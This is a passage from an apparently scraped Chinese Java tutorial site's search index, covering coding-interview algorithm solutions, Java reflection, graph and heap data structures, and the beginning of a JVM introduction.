无符号右移运算符，不管移动前最高位是0还是1，右移后左侧产生的空位部分都以0来填充。与\u0026raquo;类似。 例： int a = 16; int b = a \u0026laquo; 2;//左移2，等同于16 * 2的2次方，也就是16 * 4 int c = a \u0026raquo; 2;//右移2，等同于16 / 2的2次方，也就是16 / 4  四 二维数组查找    题目描述：    在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。\n问题解析：    这一道题还是比较简单的，我们需要考虑的是如何做，效率最快。这里有一种很好理解的思路：\n 矩阵是有序的，从左下角来看，向上数字递减，向右数字递增， 因此从左下角开始查找，当要查找数字比左下角数字大时。右移 要查找数字比左下角数字小时，上移。这样找的速度最快。\n 示例代码：    public boolean Find(int target, int [][] array) { //基本思路从左下角开始找，这样速度最快  int row = array.length-1;//行  int column = 0;//列  //当行数大于0，当前列数小于总列数时循环条件成立  while((row \u0026gt;= 0)\u0026amp;\u0026amp; (column\u0026lt; array[0].length)){ if(array[row][column] \u0026gt; target){ row--; }else if(array[row][column] \u0026lt; target){ column++; }else{ return true; } } return false; } 五 替换空格    题目描述：    请实现一个函数，将一个字符串中的空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。\n问题分析：    这道题不难，我们可以通过循环判断字符串的字符是否为空格，是的话就利用append()方法添加追加“%20”，否则还是追加原字符。\n或者最简单的方法就是利用：replaceAll(String regex,String replacement)方法了，一行代码就可以解决。\n示例代码：    常规做法：\npublic String replaceSpace(StringBuffer str) { StringBuffer out = new StringBuffer(); for (int i = 0; i \u0026lt; str.toString().length(); i++) { char b = str.charAt(i); if(String.valueOf(b).equals(\u0026#34; \u0026#34;)){ out.append(\u0026#34;%20\u0026#34;); }else{ out.append(b); } } return out.toString(); } 一行代码解决：\npublic String replaceSpace(StringBuffer str) { //return str.toString().replaceAll(\u0026#34; \u0026#34;, \u0026#34;%20\u0026#34;);  //public String replaceAll(String regex,String replacement)  //用给定的替换替换与给定的regular expression匹配的此字符串的每个子字符串。  //\\ 转义字符. 如果你要使用 \u0026#34;\\\u0026#34; 本身, 则应该使用 \u0026#34;\\\\\u0026#34;. String类型中的空格用“\\s”表示，所以我这里猜测\u0026#34;\\\\s\u0026#34;就是代表空格的意思  return str.toString().replaceAll(\u0026#34;\\\\s\u0026#34;, \u0026#34;%20\u0026#34;); } 六 数值的整数次方    题目描述：    给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。\n问题解析：    这道题算是比较麻烦和难一点的一个了。我这里采用的是二分幂思想，当然也可以采用快速幂。 更具剑指offer书中细节，该题的解题思路如下： 1.当底数为0且指数\u0026lt;0时，会出现对0求倒数的情况，需进行错误处理，设置一个全局变量； 2.判断底数是否等于0，由于base为double型，所以不能直接用==判断 3.优化求幂函数（二分幂）。 当n为偶数，a^n =（a^n/2）*（a^n/2）； 当n为奇数，a^n = a^[(n-1)/2] * a^[(n-1)/2] * a。时间复杂度O(logn)\n时间复杂度：O(logn)\n示例代码：    public class Solution { boolean invalidInput=false; public double Power(double base, int exponent) { //如果底数等于0并且指数小于0  //由于base为double型，不能直接用==判断  if(equal(base,0.0)\u0026amp;\u0026amp;exponent\u0026lt;0){ invalidInput=true; return 0.0; } int absexponent=exponent; //如果指数小于0，将指数转正  if(exponent\u0026lt;0) absexponent=-exponent; //getPower方法求出base的exponent次方。  double res=getPower(base,absexponent); //如果指数小于0，所得结果为上面求的结果的倒数  if(exponent\u0026lt;0) res=1.0/res; return res; } //比较两个double型变量是否相等的方法  boolean equal(double num1,double num2){ if(num1-num2\u0026gt;-0.000001\u0026amp;\u0026amp;num1-num2\u0026lt;0.000001) return true; else return false; } //求出b的e次方的方法  double getPower(double b,int e){ //如果指数为0，返回1  if(e==0) return 1.0; //如果指数为1，返回b  if(e==1) return b; //e\u0026gt;\u0026gt;1相等于e/2，这里就是求a^n =（a^n/2）*（a^n/2）  double result=getPower(b,e\u0026gt;\u0026gt;1); result*=result; //如果指数n为奇数，则要再乘一次底数base  if((e\u0026amp;1)==1) result*=b; return result; } } 当然这一题也可以采用笨方法：累乘。不过这种方法的时间复杂度为O（n），这样没有前一种方法效率高。\n// 使用累乘 public double powerAnother(double base, int exponent) { double result = 1.0; for (int i = 0; i \u0026lt; Math.abs(exponent); i++) { result *= base; } if (exponent \u0026gt;= 0) return result; else return 1 / result; } 七 调整数组顺序使奇数位于偶数前面    题目描述：    输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。\n问题解析：    这道题有挺多种解法的，给大家介绍一种我觉得挺好理解的方法： 我们首先统计奇数的个数假设为n,然后新建一个等长数组，然后通过循环判断原数组中的元素为偶数还是奇数。如果是则从数组下标0的元素开始，把该奇数添加到新数组；如果是偶数则从数组下标为n的元素开始把该偶数添加到新数组中。\n示例代码：    时间复杂度为O（n），空间复杂度为O（n）的算法\npublic class Solution { public void reOrderArray(int [] array) { //如果数组长度等于0或者等于1，什么都不做直接返回  if(array.length==0||array.length==1) return; //oddCount：保存奇数个数  //oddBegin：奇数从数组头部开始添加  int oddCount=0,oddBegin=0; //新建一个数组  int[] newArray=new int[array.length]; //计算出（数组中的奇数个数）开始添加元素  for(int i=0;i\u0026lt;array.length;i++){ if((array[i]\u0026amp;1)==1) oddCount++; } for(int i=0;i\u0026lt;array.length;i++){ //如果数为基数新数组从头开始添加元素  //如果为偶数就从oddCount（数组中的奇数个数）开始添加元素  if((array[i]\u0026amp;1)==1) newArray[oddBegin++]=array[i]; else newArray[oddCount++]=array[i]; } for(int i=0;i\u0026lt;array.length;i++){ array[i]=newArray[i]; } } } 八 链表中倒数第k个节点    题目描述：    输入一个链表，输出该链表中倒数第k个结点\n问题分析：    一句话概括： 两个指针一个指针p1先开始跑，指针p1跑到k-1个节点后，另一个节点p2开始跑，当p1跑到最后时，p2所指的指针就是倒数第k个节点。\n思想的简单理解： 前提假设：链表的结点个数(长度)为n。 规律一：要找到倒数第k个结点，需要向前走多少步呢？比如倒数第一个结点，需要走n步，那倒数第二个结点呢？很明显是向前走了n-1步，所以可以找到规律是找到倒数第k个结点，需要向前走n-k+1步。 算法开始：\n 设两个都指向head的指针p1和p2，当p1走了k-1步的时候，停下来。p2之前一直不动。 p1的下一步是走第k步，这个时候，p2开始一起动了。至于为什么p2这个时候动呢？看下面的分析。 当p1走到链表的尾部时，即p1走了n步。由于我们知道p2是在p1走了k-1步才开始动的，也就是说p1和p2永远差k-1步。所以当p1走了n步时，p2走的应该是在n-(k-1)步。即p2走了n-k+1步，此时巧妙的是p2正好指向的是规律一的倒数第k个结点处。 这样是不是很好理解了呢？  考察内容：    链表+代码的鲁棒性\n示例代码：    /* //链表类 public class ListNode { int val; ListNode next = null; ListNode(int val) { this.val = val; } }*/ //时间复杂度O(n),一次遍历即可 public class Solution { public ListNode FindKthToTail(ListNode head,int k) { ListNode pre=null,p=null; //两个指针都指向头结点  p=head; pre=head; //记录k值  int a=k; //记录节点的个数  int count=0; //p指针先跑，并且记录节点数，当p指针跑了k-1个节点后，pre指针开始跑，  //当p指针跑到最后时，pre所指指针就是倒数第k个节点  while(p!=null){ p=p.next; count++; if(k\u0026lt;1){ pre=pre.next; } k--; } //如果节点个数小于所求的倒数第k个节点，则返回空  if(count\u0026lt;a) return null; return pre; } } 九 反转链表    题目描述：    输入一个链表，反转链表后，输出链表的所有元素。\n问题分析：    链表的很常规的一道题，这一道题思路不算难，但自己实现起来真的可能会感觉无从下手，我是参考了别人的代码。 思路就是我们根据链表的特点，前一个节点指向下一个节点的特点，把后面的节点移到前面来。 就比如下图：我们把1节点和2节点互换位置，然后再将3节点指向2节点，4节点指向3节点，这样以来下面的链表就被反转了。 考察内容：    链表+代码的鲁棒性\n示例代码：    /* public class ListNode { int val; ListNode next = null; ListNode(int val) { this.val = val; } }*/ public class Solution { public ListNode ReverseList(ListNode head) { ListNode next = null; ListNode pre = null; while (head != null) { //保存要反转到头来的那个节点  next = head.next; //要反转的那个节点指向已经反转的上一个节点  head.next = pre; //上一个已经反转到头部的节点  pre = head; //一直向链表尾走  head = next; } return pre; } } 十 合并两个排序的链表    题目描述：    输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。\n问题分析：    我们可以这样分析:\n 假设我们有两个链表 A,B； A的头节点A1的值与B的头结点B1的值比较，假设A1小，则A1为头节点； A2再和B1比较，假设B1小,则，A1指向B1； A2再和B2比较。。。。。。。 就这样循环往复就行了，应该还算好理解。  考察内容：    链表+代码的鲁棒性\n示例代码：    非递归版本：\n/* public class ListNode { int val; ListNode next = null; ListNode(int val) { this.val = val; } }*/ public class Solution { public ListNode Merge(ListNode list1,ListNode list2) { //list1为空，直接返回list2  if(list1 == null){ return list2; } //list2为空，直接返回list1  if(list2 == null){ return list1; } ListNode mergeHead = null; ListNode current = null; //当list1和list2不为空时  while(list1!=null \u0026amp;\u0026amp; list2!=null){ //取较小值作头结点  if(list1.val \u0026lt;= list2.val){ if(mergeHead == null){ mergeHead = current = list1; }else{ current.next = list1; //current节点保存list1节点的值因为下一次还要用  current = list1; } //list1指向下一个节点  list1 = list1.next; }else{ if(mergeHead == null){ mergeHead = current = list2; }else{ current.next = list2; //current节点保存list2节点的值因为下一次还要用  current = list2; } //list2指向下一个节点  list2 = list2.next; } } if(list1 == null){ current.next = list2; }else{ current.next = list1; } return mergeHead; } } 递归版本：\npublic ListNode Merge(ListNode list1,ListNode list2) { if(list1 == null){ return list2; } if(list2 == null){ return list1; } if(list1.val \u0026lt;= list2.val){ list1.next = Merge(list1.next, list2); return list1; }else{ list2.next = Merge(list1, list2.next); return list2; } } 十一 用两个栈实现队列    题目描述：    用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。\n问题分析：    先来回顾一下栈和队列的基本特点： **栈：**后进先出（LIFO） 队列： 先进先出 很明显我们需要根据JDK给我们提供的栈的一些基本方法来实现。先来看一下Stack类的一些基本方法： 既然题目给了我们两个栈，我们可以这样考虑当push的时候将元素push进stack1，pop的时候我们先把stack1的元素pop到stack2，然后再对stack2执行pop操作，这样就可以保证是先进先出的。（负[pop]负[pop]得正[先进先出]）\n考察内容：    队列+栈\n示例代码：    //左程云的《程序员代码面试指南》的答案 import java.util.Stack; public class Solution { Stack\u0026lt;Integer\u0026gt; stack1 = new Stack\u0026lt;Integer\u0026gt;(); Stack\u0026lt;Integer\u0026gt; stack2 = new Stack\u0026lt;Integer\u0026gt;(); //当执行push操作时，将元素添加到stack1  public void push(int node) { stack1.push(node); } public int pop() { //如果两个队列都为空则抛出异常,说明用户没有push进任何元素  if(stack1.empty()\u0026amp;\u0026amp;stack2.empty()){ throw new RuntimeException(\u0026#34;Queue is empty!\u0026#34;); } //如果stack2不为空直接对stack2执行pop操作，  if(stack2.empty()){ while(!stack1.empty()){ //将stack1的元素按后进先出push进stack2里面  stack2.push(stack1.pop()); } } return stack2.pop(); } } 十二 栈的压入,弹出序列    题目描述：    输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列1,2,3,4,5是某栈的压入顺序，序列4，5,3,2,1是该压栈序列对应的一个弹出序列，但4,3,5,1,2就不可能是该压栈序列的弹出序列。（注意：这两个序列的长度是相等的）\n题目分析：    这道题想了半天没有思路，参考了Alias的答案，他的思路写的也很详细应该很容易看懂。 作者：Alias https://www.nowcoder.com/questionTerminal/d77d11405cc7470d82554cb392585106 来源：牛客网\n【思路】借用一个辅助的栈，遍历压栈顺序，先讲第一个放入栈中，这里是1，然后判断栈顶元素是不是出栈顺序的第一个元素，这里是4，很显然1≠4，所以我们继续压栈，直到相等以后开始出栈，出栈一个元素，则将出栈顺序向后移动一位，直到不相等，这样循环等压栈顺序遍历完成，如果辅助栈还不为空，说明弹出序列不是该栈的弹出顺序。\n举例：\n入栈1,2,3,4,5\n出栈4,5,3,2,1\n首先1入辅助栈，此时栈顶1≠4，继续入栈2\n此时栈顶2≠4，继续入栈3\n此时栈顶3≠4，继续入栈4\n此时栈顶4＝4，出栈4，弹出序列向后一位，此时为5，,辅助栈里面是1,2,3\n此时栈顶3≠5，继续入栈5\n此时栈顶5=5，出栈5,弹出序列向后一位，此时为3，,辅助栈里面是1,2,3\n…. 依次执行，最后辅助栈为空。如果不为空说明弹出序列不是该栈的弹出顺序。\n考察内容：    栈\n示例代码：    import java.util.ArrayList; import java.util.Stack; //这道题没想出来，参考了Alias同学的答案：https://www.nowcoder.com/questionTerminal/d77d11405cc7470d82554cb392585106 public class Solution { public boolean IsPopOrder(int [] pushA,int [] popA) { if(pushA.length == 0 || popA.length == 0) return false; Stack\u0026lt;Integer\u0026gt; s = new Stack\u0026lt;Integer\u0026gt;(); //用于标识弹出序列的位置  int popIndex = 0; for(int i = 0; i\u0026lt; pushA.length;i++){ s.push(pushA[i]); //如果栈不为空，且栈顶元素等于弹出序列  while(!s.empty() \u0026amp;\u0026amp;s.peek() == popA[popIndex]){ //出栈  s.pop(); //弹出序列向后一位  popIndex++; } } return s.empty(); } } "},{"id":337,"href":"/java/basis/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","title":"反射机制","parent":"basis","content":"何为反射？    如果说大家研究过框架的底层原理或者咱们自己写过框架的话，一定对反射这个概念不陌生。\n反射之所以被称为框架的灵魂，主要是因为它赋予了我们在运行时分析类以及执行类中方法的能力。\n通过反射你可以获取任意一个类的所有属性和方法，你还可以调用这些方法和属性。\n反射的应用场景了解么？    像咱们平时大部分时候都是在写业务代码，很少会接触到直接使用反射机制的场景。\n但是，这并不代表反射没有用。相反，正是因为反射，你才能这么轻松地使用各种框架。像 Spring/Spring Boot、MyBatis 等等框架中都大量使用了反射机制。\n这些框架中也大量使用了动态代理，而动态代理的实现也依赖反射。\n比如下面是通过 JDK 实现动态代理的示例代码，其中就使用了反射类 Method 来调用指定的方法。\npublic class DebugInvocationHandler implements InvocationHandler { /** * 代理类中的真实对象 */ private final Object target; public DebugInvocationHandler(Object target) { this.target = target; } public Object invoke(Object proxy, Method method, Object[] args) throws InvocationTargetException, IllegalAccessException { System.out.println(\u0026#34;before method \u0026#34; + method.getName()); Object result = method.invoke(target, args); System.out.println(\u0026#34;after method \u0026#34; + method.getName()); return result; } } 另外，像 Java 中的一大利器 注解 的实现也用到了反射。\n为什么你使用 Spring 的时候 ，一个@Component注解就声明了一个类为 Spring Bean 呢？为什么你通过一个 @Value注解就读取到配置文件中的值呢？究竟是怎么起作用的呢？\n这些都是因为你可以基于反射分析类，然后获取到类/属性/方法/方法的参数上的注解。你获取到注解之后，就可以做进一步的处理。\n谈谈反射机制的优缺点    优点 ： 可以让咱们的代码更加灵活、为各种框架提供开箱即用的功能提供了便利\n缺点 ：让我们在运行时有了分析操作类的能力，这同样也增加了安全问题。比如可以无视泛型参数的安全检查（泛型参数的安全检查发生在编译时）。另外，反射的性能也要稍差点，不过，对于框架来说实际是影响不大的。相关阅读：Java Reflection: Why is it so slow?\n反射实战    获取 Class 对象的四种方式    如果我们动态获取到这些信息，我们需要依靠 Class 对象。Class 类对象将一个类的方法、变量等信息告诉运行的程序。Java 提供了四种方式获取 Class 对象:\n1.知道具体类的情况下可以使用：\nClass alunbarClass = TargetObject.class; 但是我们一般是不知道具体类的，基本都是通过遍历包下面的类来获取 Class 对象，通过此方式获取 Class 对象不会进行初始化\n2.通过 Class.forName()传入类的路径获取：\nClass alunbarClass1 = Class.forName(\u0026#34;cn.javaguide.TargetObject\u0026#34;); 3.通过对象实例instance.getClass()获取：\nTargetObject o = new TargetObject(); Class alunbarClass2 = o.getClass(); 4.通过类加载器xxxClassLoader.loadClass()传入类路径获取:\nClass clazz = ClassLoader.loadClass(\u0026#34;cn.javaguide.TargetObject\u0026#34;); 通过类加载器获取 Class 对象不会进行初始化，意味着不进行包括初始化等一些列步骤，静态块和静态对象不会得到执行\n反射的一些基本操作    简单用代码演示一下反射的一些操作!\n1.创建一个我们要使用反射操作的类 TargetObject。\npackage cn.javaguide; public class TargetObject { private String value; public TargetObject() { value = \u0026#34;JavaGuide\u0026#34;; } public void publicMethod(String s) { System.out.println(\u0026#34;I love \u0026#34; + s); } private void privateMethod() { System.out.println(\u0026#34;value is \u0026#34; + value); } } 2.使用反射操作这个类的方法以及参数\npackage cn.javaguide; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, NoSuchFieldException { /** * 获取TargetObject类的Class对象并且创建TargetObject类实例 */ Class\u0026lt;?\u0026gt; tagetClass = Class.forName(\u0026#34;cn.javaguide.TargetObject\u0026#34;); TargetObject targetObject = (TargetObject) tagetClass.newInstance(); /** * 获取所有类中所有定义的方法 */ Method[] methods = tagetClass.getDeclaredMethods(); for (Method method : methods) { System.out.println(method.getName()); } /** * 获取指定方法并调用 */ Method publicMethod = tagetClass.getDeclaredMethod(\u0026#34;publicMethod\u0026#34;, String.class); publicMethod.invoke(targetObject, \u0026#34;JavaGuide\u0026#34;); /** * 获取指定参数并对参数进行修改 */ Field field = tagetClass.getDeclaredField(\u0026#34;value\u0026#34;); //为了对类中的参数进行修改我们取消安全检查  field.setAccessible(true); field.set(targetObject, \u0026#34;JavaGuide\u0026#34;); /** * 调用 private 方法 */ Method privateMethod = tagetClass.getDeclaredMethod(\u0026#34;privateMethod\u0026#34;); //为了调用private方法我们取消安全检查  privateMethod.setAccessible(true); privateMethod.invoke(targetObject); } } 输出内容：\npublicMethod privateMethod I love JavaGuide value is JavaGuide 注意 : 有读者提到上面代码运行会抛出 ClassNotFoundException 异常,具体原因是你没有下面把这段代码的包名替换成自己创建的 TargetObject 所在的包 。\nClass\u0026lt;?\u0026gt; tagetClass = Class.forName(\u0026#34;cn.javaguide.TargetObject\u0026#34;); "},{"id":338,"href":"/cs-basics/data-structure/%E5%9B%BE/","title":"图","parent":"data-structure","content":"图     开头还是求点赞，求转发！原创优质公众号，希望大家能让更多人看到我们的文章。\n图片都是我们手绘的，可以说非常用心了！\n 图是一种较为复杂的非线性结构。 为啥说其较为复杂呢？\n根据前面的内容，我们知道：\n 线性数据结构的元素满足唯一的线性关系，每个元素(除第一个和最后一个外)只有一个直接前趋和一个直接后继。 树形数据结构的元素之间有着明显的层次关系。  但是，图形结构的元素之间的关系是任意的。\n何为图呢？ 简单来说，图就是由顶点的有穷非空集合和顶点之间的边组成的集合。通常表示为：G(V,E)，其中，G表示一个图，V表示顶点的集合，E表示边的集合。\n下图所展示的就是图这种数据结构，并且还是一张有向图。\n图在我们日常生活中的例子很多！比如我们在社交软件上好友关系就可以用图来表示。\n图的基本概念    顶点    图中的数据元素，我们称之为顶点，图至少有一个顶点（非空有穷集合）\n对应到好友关系图，每一个用户就代表一个顶点。\n边    顶点之间的关系用边表示。\n对应到好友关系图，两个用户是好友的话，那两者之间就存在一条边。\n度    度表示一个顶点包含多少条边，在有向图中，还分为出度和入度，出度表示从该顶点出去的边的条数，入度表示进入该顶点的边的条数。\n对应到好友关系图，度就代表了某个人的好友数量。\n无向图和有向图    边表示的是顶点之间的关系，有的关系是双向的，比如同学关系，A是B的同学，那么B也肯定是A的同学，那么在表示A和B的关系时，就不用关注方向，用不带箭头的边表示，这样的图就是无向图。\n有的关系是有方向的，比如父子关系，师生关系，微博的关注关系，A是B的爸爸，但B肯定不是A的爸爸，A关注B，B不一定关注A。在这种情况下，我们就用带箭头的边表示二者的关系，这样的图就是有向图。\n无权图和带权图    对于一个关系，如果我们只关心关系的有无，而不关心关系有多强，那么就可以用无权图表示二者的关系。\n对于一个关系，如果我们既关心关系的有无，也关心关系的强度，比如描述地图上两个城市的关系，需要用到距离，那么就用带权图来表示，带权图中的每一条边一个数值表示权值，代表关系的强度。\n图的存储    邻接矩阵存储    邻接矩阵将图用二维矩阵存储，是一种较为直观的表示方式。\n如果第i个顶点和第j个顶点之间有关系，且关系权值为n，则 A[i][j]=n 。\n在无向图中，我们只关心关系的有无，所以当顶点i和顶点j有关系时，A[i][j]=1，当顶点i和顶点j没有关系时，A[i][j]=0。如下图所示：\n值得注意的是：无向图的邻接矩阵是一个对称矩阵，因为在无向图中，顶点i和顶点j有关系，则顶点j和顶点i必有关系。\n邻接矩阵存储的方式优点是简单直接（直接使用一个二维数组即可），并且，在获取两个定点之间的关系的时候也非常高效（直接获取指定位置的数组元素的值即可）。但是，这种存储方式的缺点也比较明显，那就是比较浪费空间，\n邻接表存储    针对上面邻接矩阵比较浪费内存空间的问题，诞生了图的另外一种存储方法—邻接表 。\n邻接链表使用一个链表来存储某个顶点的所有后继相邻顶点。对于图中每个顶点Vi，把所有邻接于Vi的顶点Vj链成一个单链表，这个单链表称为顶点Vi的 邻接表。如下图所示：\n大家可以数一数邻接表中所存储的元素的个数以及图中边的条数，你会发现：\n 在无向图中，邻接表元素个数等于边的条数的两倍，如左图所示的无向图中，边的条数为7，邻接表存储的元素个数为14。 在有向图中，邻接表元素个数等于边的条数，如右图所示的有向图中，边的条数为8，邻接表存储的元素个数为8。  图的搜索    广度优先搜索    广度优先搜索就像水面上的波纹一样一层一层向外扩展，如下图所示：\n广度优先搜索的具体实现方式用到了之前所学过的线性数据结构——队列 。具体过程如下图所示：\n第1步：\n第2步：\n第3步：\n第4步：\n第5步：\n第6步：\n深度优先搜索    深度优先搜索就是“一条路走到黑”，从源顶点开始，一直走到没有后继节点，才回溯到上一顶点，然后继续“一条路走到黑”，如下图所示：\n和广度优先搜索类似，深度优先搜索的具体实现用到了另一种线性数据结构——栈 。具体过程如下图所示：\n第1步：\n第2步：\n第3步：\n第4步：\n第5步：\n第6步：\n"},{"id":339,"href":"/cs-basics/data-structure/%E5%A0%86/","title":"堆","parent":"data-structure","content":"堆    什么是堆    堆是一种满足以下条件的树：\n堆中的每一个节点值都大于等于（或小于等于）子树中所有节点的值。或者说，任意一个节点的值都大于等于（或小于等于）所有子节点的值。\n 大家可以把堆(最大堆)理解为一个公司,这个公司很公平,谁能力强谁就当老大,不存在弱的人当老大,老大手底下的人一定不会比他强。这样有助于理解后续堆的操作。\n !!!特别提示：\n 很多博客说堆是完全二叉树，其实并非如此，堆不一定是完全二叉树，只是为了方便存储和索引，我们通常用完全二叉树的形式来表示堆，事实上，广为人知的斐波那契堆和二项堆就不是完全二叉树,它们甚至都不是二叉树。 （二叉）堆是一个数组，它可以被看成是一个 近似的完全二叉树。——《算法导论》第三版  大家可以尝试判断下面给出的图是否是堆？\n第1个和第2个是堆。第1个是最大堆，每个节点都比子树中所有节点大。第2个是最小堆，每个节点都比子树中所有节点小。\n第3个不是，第三个中，根结点1比2和15小，而15却比3大，19比5大，不满足堆的性质。\n堆的用途    当我们只关心所有数据中的最大值或者最小值，存在多次获取最大值或者最小值，多次插入或删除数据时，就可以使用堆。\n有小伙伴可能会想到用有序数组，初始化一个有序数组时间复杂度是 O(nlog(n))，查找最大值或者最小值时间复杂度都是 O(1)，但是，涉及到更新（插入或删除）数据时，时间复杂度为 O(n)，即使是使用复杂度为 O(log(n)) 的二分法找到要插入或者删除的数据，在移动数据时也需要 O(n) 的时间复杂度。\n相对于有序数组而言，堆的主要优势在于更新数据效率较高。 堆的初始化时间复杂度为 O(nlog(n))，堆可以做到O(1)时间复杂度取出最大值或者最小值，O(log(n))时间复杂度插入或者删除数据，具体操作在后续章节详细介绍。\n堆的分类    堆分为 最大堆 和 最小堆。二者的区别在于节点的排序方式。\n 最大堆 ：堆中的每一个节点的值都大于等于子树中所有节点的值 最小堆 ：堆中的每一个节点的值都小于等于子树中所有节点的值  如下图所示，图1是最大堆，图2是最小堆\n堆的存储    之前介绍树的时候说过，由于完全二叉树的优秀性质，利用数组存储二叉树即节省空间，又方便索引（若根结点的序号为1，那么对于树中任意节点i，其左子节点序号为 2*i，右子节点序号为 2*i+1）。\n为了方便存储和索引，（二叉）堆可以用完全二叉树的形式进行存储。存储的方式如下图所示：\n堆的操作    堆的更新操作主要包括两种 : 插入元素 和 删除堆顶元素。操作过程需要着重掌握和理解。\n 在进入正题之前，再重申一遍，堆是一个公平的公司，有能力的人自然会走到与他能力所匹配的位置\n 插入元素     插入元素，作为一个新入职的员工，初来乍到，这个员工需要从基层做起\n 1.将要插入的元素放到最后\n 有能力的人会逐渐升职加薪，是金子总会发光的！！！\n 2.从底向上，如果父结点比该元素大，则该节点和父结点交换，直到无法交换\n删除堆顶元素    根据堆的性质可知，最大堆的堆顶元素为所有元素中最大的，最小堆的堆顶元素是所有元素中最小的。当我们需要多次查找最大元素或者最小元素的时候，可以利用堆来实现。\n删除堆顶元素后，为了保持堆的性质，需要对堆的结构进行调整，我们将这个过程称之为\u0026quot;堆化\u0026quot;，堆化的方法分为两种：\n 一种是自底向上的堆化，上述的插入元素所使用的就是自底向上的堆化，元素从最底部向上移动。 另一种是自顶向下堆化，元素由最顶部向下移动。在讲解删除堆顶元素的方法时，我将阐述这两种操作的过程，大家可以体会一下二者的不同。  自底向上堆化     在堆这个公司中，会出现老大离职的现象，老大离职之后，他的位置就空出来了\n 首先删除堆顶元素，使得数组中下标为1的位置空出。\n 那么他的位置由谁来接替呢，当然是他的直接下属了，谁能力强就让谁上呗\n 比较根结点的左子节点和右子节点，也就是下标为2,3的数组元素，将较大的元素填充到根结点(下标为1)的位置。\n 这个时候又空出一个位置了，老规矩，谁有能力谁上\n 一直循环比较空出位置的左右子节点，并将较大者移至空位，直到堆的最底部\n这个时候已经完成了自底向上的堆化，没有元素可以填补空缺了，但是，我们可以看到数组中出现了“气泡”，这会导致存储空间的浪费。接下来我们试试自顶向下堆化。\n自顶向下堆化    自顶向下的堆化用一个词形容就是“石沉大海”，那么第一件事情，就是把石头抬起来，从海面扔下去。这个石头就是堆的最后一个元素，我们将最后一个元素移动到堆顶。\n然后开始将这个石头沉入海底，不停与左右子节点的值进行比较，和较大的子节点交换位置，直到无法交换位置。\n堆的操作总结     插入元素 ：先将元素放至数组末尾，再自底向上堆化，将末尾元素上浮 删除堆顶元素 ：删除堆顶元素，将末尾元素放至堆顶，再自顶向下堆化，将堆顶元素下沉。也可以自底向上堆化，只是会产生“气泡”，浪费存储空间。最好采用自顶向下堆化的方式。  堆排序    堆排序的过程分为两步：\n 第一步是建堆，将一个无序的数组建立为一个堆 第二步是排序，将堆顶元素取出，然后对剩下的元素进行堆化，反复迭代，直到所有元素被取出为止。  建堆    如果你已经足够了解堆化的过程，那么建堆的过程掌握起来就比较容易了。建堆的过程就是一个对所有非叶节点的自顶向下堆化过程。\n首先要了解哪些是非叶节点，最后一个节点的父结点及它之前的元素，都是非叶节点。也就是说，如果节点个数为n，那么我们需要对n/2到1的节点进行自顶向下（沉底）堆化。\n具体过程如下图：\n将初始的无序数组抽象为一棵树，图中的节点个数为6，所以4,5,6节点为叶节点，1,2,3节点为非叶节点，所以要对1-3号节点进行自顶向下（沉底）堆化，注意，顺序是从后往前堆化，从3号节点开始，一直到1号节点。 3号节点堆化结果：\n2号节点堆化结果：\n1号节点堆化结果：\n至此，数组所对应的树已经成为了一个最大堆，建堆完成！\n排序    由于堆顶元素是所有元素中最大的，所以我们重复取出堆顶元素，将这个最大的堆顶元素放至数组末尾，并对剩下的元素进行堆化即可。\n现在思考两个问题：\n 删除堆顶元素后需要执行自顶向下（沉底）堆化还是自底向上（上浮）堆化？ 取出的堆顶元素存在哪，新建一个数组存？  先回答第一个问题，我们需要执行自顶向下（沉底）堆化，这个堆化一开始要将末尾元素移动至堆顶，这个时候末尾的位置就空出来了，由于堆中元素已经减小，这个位置不会再被使用，所以我们可以将取出的元素放在末尾。\n机智的小伙伴已经发现了，这其实是做了一次交换操作，将堆顶和末尾元素调换位置，从而将取出堆顶元素和堆化的第一步(将末尾元素放至根结点位置)进行合并。\n详细过程如下图所示：\n取出第一个元素并堆化：\n取出第二个元素并堆化：\n取出第三个元素并堆化：\n取出第四个元素并堆化：\n取出第五个元素并堆化：\n取出第六个元素并堆化：\n堆排序完成！\n"},{"id":340,"href":"/java/jvm/%E5%A4%A7%E7%99%BD%E8%AF%9D%E5%B8%A6%E4%BD%A0%E8%AE%A4%E8%AF%86JVM/","title":"大白话带你认识JVM","parent":"jvm","content":" 来自掘金用户：说出你的愿望吧丷投稿，原文地址：https://juejin.im/post/5e1505d0f265da5d5d744050#heading-28\n 前言    如果在文中用词或者理解方面出现问题，欢迎指出。此文旨在提及而不深究，但会尽量效率地把知识点都抛出来\n一、JVM的基本介绍    JVM 是 Java Virtual Machine 的缩写，它是一个虚构出来的计算机，一种规范。通过在实际的计算机上仿真模拟各类计算机功能实现···\n好，其实抛开这么专业的句子不说，就知道JVM其实就类似于一台小电脑运行在windows或者linux这些操作系统环境下即可。它直接和操作系统进行交互，与硬件不直接交互，而操作系统可以帮我们完成和硬件进行交互的工作。\n1.1 Java文件是如何被运行的    比如我们现在写了一个 HelloWorld.java 好了，那这个 HelloWorld.java 抛开所有东西不谈，那是不是就类似于一个文本文件，只是这个文本文件它写的都是英文，而且有一定的缩进而已。\n那我们的 JVM 是不认识文本文件的，所以它需要一个 编译 ，让其成为一个它会读二进制文件的 HelloWorld.class\n① 类加载器    如果 JVM 想要执行这个 .class 文件，我们需要将其装进一个 类加载器 中，它就像一个搬运工一样，会把所有的 .class 文件全部搬进JVM里面来。\n② 方法区    方法区 是用于存放类似于元数据信息方面的数据的，比如类信息，常量，静态变量，编译后代码···等\n类加载器将 .class 文件搬过来就是先丢到这一块上\n③ 堆    堆 主要放了一些存储的数据，比如对象实例，数组···等，它和方法区都同属于 